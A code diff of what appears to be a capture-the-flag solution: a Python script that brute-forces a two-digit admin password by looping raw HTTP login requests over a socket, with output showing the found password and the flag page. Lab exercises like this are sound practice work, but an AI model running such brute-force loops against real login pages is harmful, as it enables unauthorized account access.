@@ -26,7 +26,7 @@ agent = 'python'
 # Process, output
 for password in range(100):
     pwd = str(password).rjust(2, '0')
-    print(f"Trying password '{pwd}'")
+    # print(f"Trying password '{pwd}'")
     s = socket.socket()
     s.settimeout(2)
     s.connect((target, port))
@@ -47,63 +47,27 @@ Accept-Language: en-US,en;q=0.9\r
     reply = s.recv(1024).decode()
     if 'Successful login!' in reply:
         print(f"  Admin password is '{pwd}'")
+        print(reply)
         break
     s.close()
 
-# Trying password '00'
-# Trying password '01'
-# Trying password '02'
-# Trying password '03'
-# Trying password '04'
-# Trying password '05'
-# Trying password '06'
-# Trying password '07'
-# Trying password '08'
-# Trying password '09'
-# Trying password '10'
-# Trying password '11'
-# Trying password '12'
-# Trying password '13'
-# Trying password '14'
-# Trying password '15'
-# Trying password '16'
-# Trying password '17'
-# Trying password '18'
-# Trying password '19'
-# Trying password '20'
-# Trying password '21'
-# Trying password '22'
-# Trying password '23'
-# Trying password '24'
-# Trying password '25'
-# Trying password '26'
-# Trying password '27'
-# Trying password '28'
-# Trying password '29'
-# Trying password '30'
-# Trying password '31'
-# Trying password '32'
-# Trying password '33'
-# Trying password '34'
-# Trying password '35'
-# Trying password '36'
-# Trying password '37'
-# Trying password '38'
-# Trying password '39'
-# Trying password '40'
-# Trying password '41'
-# Trying password '42'
-# Trying password '43'
-# Trying password '44'
-# Trying password '45'
-# Trying password '46'
-# Trying password '47'
-# Trying password '48'
-# Trying password '49'
-# Trying password '50'
-# Trying password '51'
-# Trying password '52'
-# Trying password '53'
-# Trying password '54'
-# Trying password '55'
 #   Admin password is '55'
+# HTTP/1.1 200 OK
+# Date: Wed, 02 Nov 2022 23:00:19 GMT
+# Server: Apache/2.4.29 (Ubuntu)
+# Vary: Accept-Encoding
+# Content-Length: 165
+# Keep-Alive: timeout=5, max=100
+# Connection: Keep-Alive
+# Content-Type: text/html; charset=UTF-8
+#
+#  <html>
+# <head>
+# <title>Login Page</title>
+# </head>
+# <body bgcolor="#cccccc"  style="font-family:Arial">
+#
+# <h2>Successful login!</h2>The flag is looping
+#
+# </body>
+# </html>
